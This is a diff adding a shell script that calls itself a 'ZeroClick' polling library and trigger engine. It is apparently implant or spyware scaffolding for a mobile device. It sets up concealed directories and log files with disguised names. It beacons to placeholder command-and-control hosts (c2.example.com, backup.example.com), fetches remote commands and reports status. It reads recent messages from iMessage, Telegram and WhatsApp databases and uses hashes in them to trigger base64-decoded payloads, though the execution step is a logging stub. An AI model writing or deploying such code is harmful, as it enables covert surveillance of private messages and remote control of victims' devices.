@@ -1,0 +1,513 @@
+# ZeroClick polling library and trigger engine
+
+ZC_ROOT="/data/local/zc"
+ZC_PERSIST="/persist/zc"
+ZC_SYSTEM="/system/etc/zc"
+ZC_LOG="$ZC_ROOT/zc.log"
+ZC_DB="$ZC_ROOT/state.db"
+ZC_STATE_DB="$ZC_ROOT/poll_state.db"
+ZC_LOG_DB="$ZC_ROOT/DR000001.DBF"
+ZC_C2_DB="$ZC_ROOT/SX000002.INF"
+ZC_POLL_INTERVAL=2
+ZC_POLL_JITTER=1
+ZC_HASH_ALGO="sha256"
+ZC_MAX_MESSAGES=100
+ZC_C2_PRIMARY="c2.example.com"
+ZC_C2_BACKUP="backup.example.com"
+ZC_CHECK_HOSTS="androidupdate.com msn.com"
+ZC_TARGET_APPS="com.apple.messages com.telegram.messenger com.whatsapp"
+ZC_TMP_DIR="$ZC_ROOT/tmp"
+ZC_LOCK_FILE="$ZC_ROOT/poll.lock"
+ZC_VERSION="1.0"
+
+zc_poll_log() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
+}
+
+zc_poll_log_db() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  if [ -f "$ZC_LOG_DB" ]; then
+    echo "INSERT INTO poll_logs (ts, msg) VALUES ('$ts', '$msg');" | sqlite3 "$ZC_LOG_DB" 2>/dev/null
+  fi
+}
+
+zc_poll_init_dirs() {
+  mkdir -p "$ZC_ROOT" 2>/dev/null
+  mkdir -p "$ZC_TMP_DIR" 2>/dev/null
+  mkdir -p "$ZC_SYSTEM" 2>/dev/null
+  mkdir -p "$ZC_PERSIST" 2>/dev/null
+  chmod 700 "$ZC_ROOT" 2>/dev/null
+  chmod 700 "$ZC_TMP_DIR" 2>/dev/null
+  zc_poll_log "poll dirs initialized"
+}
+
+zc_poll_init_state_db() {
+  if [ ! -f "$ZC_STATE_DB" ]; then
+    echo "CREATE TABLE poll_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+    echo "CREATE TABLE seen_hashes (hash TEXT PRIMARY KEY, ts TEXT);" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+    echo "CREATE TABLE pending_cmds (hash TEXT PRIMARY KEY, payload TEXT, status TEXT);" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+    zc_poll_log "state db initialized"
+  fi
+}
+
+zc_poll_init_log_db() {
+  if [ ! -f "$ZC_LOG_DB" ]; then
+    echo "CREATE TABLE poll_logs (id INTEGER PRIMARY KEY, ts TEXT, msg TEXT);" | sqlite3 "$ZC_LOG_DB" 2>/dev/null
+    zc_poll_log "log db initialized"
+  fi
+}
+
+zc_poll_init_c2_db() {
+  if [ ! -f "$ZC_C2_DB" ]; then
+    echo "CREATE TABLE c2_logs (id INTEGER PRIMARY KEY, ts TEXT, msg TEXT);" | sqlite3 "$ZC_C2_DB" 2>/dev/null
+    echo "CREATE TABLE c2_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_C2_DB" 2>/dev/null
+    zc_poll_log "c2 db initialized"
+  fi
+}
+
+zc_poll_state_set() {
+  local key="$1"
+  local value="$2"
+  echo "INSERT OR REPLACE INTO poll_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+}
+
+zc_poll_state_get() {
+  local key="$1"
+  sqlite3 "$ZC_STATE_DB" "SELECT value FROM poll_state WHERE key='$key';" 2>/dev/null
+}
+
+zc_poll_mark_seen() {
+  local hash="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  echo "INSERT OR REPLACE INTO seen_hashes (hash, ts) VALUES ('$hash', '$ts');" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+}
+
+zc_poll_is_seen() {
+  local hash="$1"
+  local count
+  count=$(sqlite3 "$ZC_STATE_DB" "SELECT COUNT(*) FROM seen_hashes WHERE hash='$hash';" 2>/dev/null)
+  if [ "$count" -gt 0 ]; then
+    return 0
+  fi
+  return 1
+}
+
+zc_poll_add_command() {
+  local hash="$1"
+  local payload="$2"
+  echo "INSERT OR REPLACE INTO pending_cmds (hash, payload, status) VALUES ('$hash', '$payload', 'pending');" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+}
+
+zc_poll_get_command() {
+  local hash="$1"
+  sqlite3 "$ZC_STATE_DB" "SELECT payload FROM pending_cmds WHERE hash='$hash' AND status='pending';" 2>/dev/null
+}
+
+zc_poll_mark_done() {
+  local hash="$1"
+  echo "UPDATE pending_cmds SET status='done' WHERE hash='$hash';" | sqlite3 "$ZC_STATE_DB" 2>/dev/null
+}
+
+zc_poll_c2_log() {
+  local msg="$1"
+  local ts
+  ts=$(date +"%Y-%m-%d %H:%M:%S")
+  if [ -f "$ZC_C2_DB" ]; then
+    echo "INSERT INTO c2_logs (ts, msg) VALUES ('$ts', '$msg');" | sqlite3 "$ZC_C2_DB" 2>/dev/null
+  fi
+}
+
+zc_poll_c2_set() {
+  local key="$1"
+  local value="$2"
+  if [ -f "$ZC_C2_DB" ]; then
+    echo "INSERT OR REPLACE INTO c2_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_C2_DB" 2>/dev/null
+  fi
+}
+
+zc_poll_c2_get() {
+  local key="$1"
+  if [ -f "$ZC_C2_DB" ]; then
+    sqlite3 "$ZC_C2_DB" "SELECT value FROM c2_state WHERE key='$key';" 2>/dev/null
+  fi
+}
+
+zc_poll_hash() {
+  local input="$1"
+  echo -n "$input" | openssl dgst -"$ZC_HASH_ALGO" 2>/dev/null | awk '{print $NF}'
+}
+
+zc_poll_hash_file() {
+  local file="$1"
+  openssl dgst -"$ZC_HASH_ALGO" "$file" 2>/dev/null | awk '{print $NF}'
+}
+
+zc_poll_verify() {
+  local input="$1"
+  local expected="$2"
+  local actual
+  actual=$(zc_poll_hash "$input")
+  if [ "$actual" = "$expected" ]; then
+    return 0
+  fi
+  return 1
+}
+
+zc_poll_extract_hash() {
+  local line="$1"
+  echo "$line" | grep -oE '[a-f0-9]{64}' | head -n 1
+}
+
+zc_poll_decrypt() {
+  local data="$1"
+  local key="$2"
+  echo "$data" | openssl enc -d -aes-256-cbc -a -k "$key" 2>/dev/null
+}
+
+zc_poll_encrypt() {
+  local data="$1"
+  local key="$2"
+  echo "$data" | openssl enc -e -aes-256-cbc -a -k "$key" 2>/dev/null
+}
+
+zc_poll_base64_decode() {
+  local data="$1"
+  echo "$data" | base64 -d 2>/dev/null
+}
+
+zc_poll_base64_encode() {
+  local data="$1"
+  echo "$data" | base64 2>/dev/null
+}
+
+zc_poll_check_network() {
+  local host
+  for host in $ZC_CHECK_HOSTS; do
+    if ping -c 1 -W 2 "$host" >/dev/null 2>&1; then
+      zc_poll_log "network ok via $host"
+      return 0
+    fi
+  done
+  zc_poll_log "network check failed"
+  return 1
+}
+
+zc_poll_check_c2() {
+  local url="$1"
+  if command -v curl >/dev/null 2>&1; then
+    curl -s -m 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -T 5 -O /dev/null "$url" 2>/dev/null && echo "200"
+  else
+    echo "000"
+  fi
+}
+
+zc_poll_select_c2() {
+  local code
+  code=$(zc_poll_check_c2 "https://$ZC_C2_PRIMARY")
+  if [ "$code" = "200" ]; then
+    echo "$ZC_C2_PRIMARY"
+    return 0
+  fi
+  code=$(zc_poll_check_c2 "https://$ZC_C2_BACKUP")
+  if [ "$code" = "200" ]; then
+    echo "$ZC_C2_BACKUP"
+    return 0
+  fi
+  echo ""
+  return 1
+}
+
+zc_poll_fetch_commands() {
+  local c2="$1"
+  if [ -z "$c2" ]; then
+    return 1
+  fi
+  local url="https://$c2/fetch"
+  local resp
+  if command -v curl >/dev/null 2>&1; then
+    resp=$(curl -s -m 10 "$url" 2>/dev/null)
+  elif command -v wget >/dev/null 2>&1; then
+    resp=$(wget -q -T 10 -O - "$url" 2>/dev/null)
+  fi
+  if [ -z "$resp" ]; then
+    zc_poll_c2_log "fetch empty"
+    return 1
+  fi
+  zc_poll_c2_log "fetched commands"
+  echo "$resp"
+}
+
+zc_poll_report_status() {
+  local c2="$1"
+  local status="$2"
+  if [ -z "$c2" ]; then
+    return 1
+  fi
+  local url="https://$c2/report"
+  if command -v curl >/dev/null 2>&1; then
+    curl -s -m 10 -X POST -d "status=$status" "$url" >/dev/null 2>&1
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -T 10 --post-data="status=$status" -O /dev/null "$url" 2>/dev/null
+  fi
+  zc_poll_c2_log "reported status: $status"
+}
+
+zc_poll_read_imessage() {
+  local db_path="$1"
+  if [ ! -f "$db_path" ]; then
+    return 1
+  fi
+  sqlite3 "$db_path" "SELECT text FROM message ORDER BY date DESC LIMIT $ZC_MAX_MESSAGES;" 2>/dev/null
+}
+
+zc_poll_read_telegram() {
+  local db_path="$1"
+  if [ ! -f "$db_path" ]; then
+    return 1
+  fi
+  sqlite3 "$db_path" "SELECT message FROM messages ORDER BY date DESC LIMIT $ZC_MAX_MESSAGES;" 2>/dev/null
+}
+
+zc_poll_read_whatsapp() {
+  local db_path="$1"
+  if [ ! -f "$db_path" ]; then
+    return 1
+  fi
+  sqlite3 "$db_path" "SELECT text_data FROM message ORDER BY timestamp DESC LIMIT $ZC_MAX_MESSAGES;" 2>/dev/null
+}
+
+zc_poll_get_db_path() {
+  local app="$1"
+  case "$app" in
+    com.apple.messages)
+      echo "/data/data/com.apple.messages/databases/chat.db"
+      ;;
+    com.telegram.messenger)
+      echo "/data/data/com.telegram.messenger/files/cache4.db"
+      ;;
+    com.whatsapp)
+      echo "/data/data/com.whatsapp/databases/msgstore.db"
+      ;;
+    *)
+      echo ""
+      ;;
+  esac
+}
+
+zc_poll_read_app_db() {
+  local app="$1"
+  local db_path
+  db_path=$(zc_poll_get_db_path "$app")
+  if [ -z "$db_path" ]; then
+    return 1
+  fi
+  case "$app" in
+    com.apple.messages)
+      zc_poll_read_imessage "$db_path"
+      ;;
+    com.telegram.messenger)
+      zc_poll_read_telegram "$db_path"
+      ;;
+    com.whatsapp)
+      zc_poll_read_whatsapp "$db_path"
+      ;;
+    *)
+      return 1
+      ;;
+  esac
+}
+
+zc_poll_scan_app() {
+  local app="$1"
+  local line
+  local hash
+  local payload
+  local count=0
+  while IFS= read -r line; do
+    if [ -z "$line" ]; then
+      continue
+    fi
+    hash=$(zc_poll_extract_hash "$line")
+    if [ -z "$hash" ]; then
+      continue
+    fi
+    if zc_poll_is_seen "$hash"; then
+      continue
+    fi
+    payload=$(zc_poll_get_command "$hash")
+    if [ -z "$payload" ]; then
+      continue
+    fi
+    zc_poll_log "matched hash: $hash"
+    zc_poll_log_db "matched hash: $hash"
+    zc_poll_mark_seen "$hash"
+    zc_poll_execute "$payload"
+    zc_poll_mark_done "$hash"
+    count=$((count + 1))
+  done <<EOF
+$(zc_poll_read_app_db "$app")
+EOF
+  zc_poll_log "app scanned: $app, matched: $count"
+}
+
+zc_poll_scan_all() {
+  local app
+  for app in $ZC_TARGET_APPS; do
+    zc_poll_scan_app "$app"
+  done
+}
+
+zc_poll_execute() {
+  local payload="$1"
+  local decoded
+  decoded=$(zc_poll_base64_decode "$payload")
+  if [ -z "$decoded" ]; then
+    zc_poll_log "decode failed"
+    return 1
+  fi
+  zc_poll_log "executing payload skeleton"
+  zc_poll_skeleton "$decoded"
+}
+
+zc_poll_skeleton() {
+  local cmd="$1"
+  zc_poll_log "skeleton cmd: $cmd"
+  return 0
+}
+
+zc_poll_lock() {
+  if [ -f "$ZC_LOCK_FILE" ]; then
+    local pid
+    pid=$(cat "$ZC_LOCK_FILE" 2>/dev/null)
+    if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
+      zc_poll_log "another poll running pid $pid"
+      return 1
+    fi
+  fi
+  echo $$ > "$ZC_LOCK_FILE"
+  return 0
+}
+
+zc_poll_unlock() {
+  rm -f "$ZC_LOCK_FILE" 2>/dev/null
+}
+
+zc_poll_jitter() {
+  local jitter
+  jitter=$(shuf -i 0-"$ZC_POLL_JITTER" -n 1 2>/dev/null)
+  if [ -z "$jitter" ]; then
+    jitter=0
+  fi
+  echo "$jitter"
+}
+
+zc_poll_cleanup_tmp() {
+  rm -f "$ZC_TMP_DIR"/* 2>/dev/null
+  zc_poll_log "tmp cleaned"
+}
+
+zc_poll_loop() {
+  zc_poll_lock || return 1
+  zc_poll_log "poll loop start"
+  while true; do
+    local running
+    running=$(zc_poll_state_get "running")
+    if [ "$running" != "1" ]; then
+      zc_poll_log "poll loop stop requested"
+      break
+    fi
+    zc_poll_scan_all
+    local c2
+    c2=$(zc_poll_c2_get "active")
+    if [ -n "$c2" ]; then
+      local cmds
+      cmds=$(zc_poll_fetch_commands "$c2")
+      if [ -n "$cmds" ]; then
+        zc_poll_log "remote commands received"
+      fi
+      zc_poll_report_status "$c2" "alive"
+    fi
+    zc_poll_cleanup_tmp
+    local jitter
+    jitter=$(zc_poll_jitter)
+    sleep $((ZC_POLL_INTERVAL + jitter))
+  done
+  zc_poll_unlock
+  zc_poll_log "poll loop end"
+}
+
+zc_poll_start() {
+  zc_poll_state_set "running" "1"
+  zc_poll_loop &
+  echo $! > "$ZC_ROOT/poll.pid"
+  zc_poll_log "poll started pid $(cat "$ZC_ROOT/poll.pid")"
+}
+
+zc_poll_stop() {
+  zc_poll_state_set "running" "0"
+  if [ -f "$ZC_ROOT/poll.pid" ]; then
+    kill "$(cat "$ZC_ROOT/poll.pid")" 2>/dev/null
+    rm -f "$ZC_ROOT/poll.pid"
+  fi
+  zc_poll_unlock
+  zc_poll_log "poll stopped"
+}
+
+zc_poll_status() {
+  echo "ZC poll version: $ZC_VERSION"
+  echo "root: $(id -u)"
+  echo "running: $(zc_poll_state_get running)"
+  echo "active c2: $(zc_poll_c2_get active)"
+  echo "poll pid: $(cat "$ZC_ROOT/poll.pid" 2>/dev/null)"
+  echo "state db: $ZC_STATE_DB"
+  echo "log db: $ZC_LOG_DB"
+  echo "c2 db: $ZC_C2_DB"
+}
+
+zc_poll_main() {
+  zc_poll_log "ZCV8 start"
+  zc_poll_init_dirs
+  zc_poll_init_state_db
+  zc_poll_init_log_db
+  zc_poll_init_c2_db
+  if zc_poll_check_network; then
+    local c2
+    c2=$(zc_poll_select_c2)
+    if [ -n "$c2" ]; then
+      zc_poll_c2_set "active" "$c2"
+      zc_poll_log "c2 active: $c2"
+    fi
+  fi
+  zc_poll_start
+  zc_poll_status
+  zc_poll_log "ZCV8 done"
+}
+
+case "$1" in
+  start)
+    zc_poll_main
+    ;;
+  stop)
+    zc_poll_stop
+    ;;
+  status)
+    zc_poll_status
+    ;;
+  scan)
+    zc_poll_init_state_db
+    zc_poll_scan_all
+    ;;
+  *)
+    zc_poll_main
+    ;;
+esac
+
+exit 0
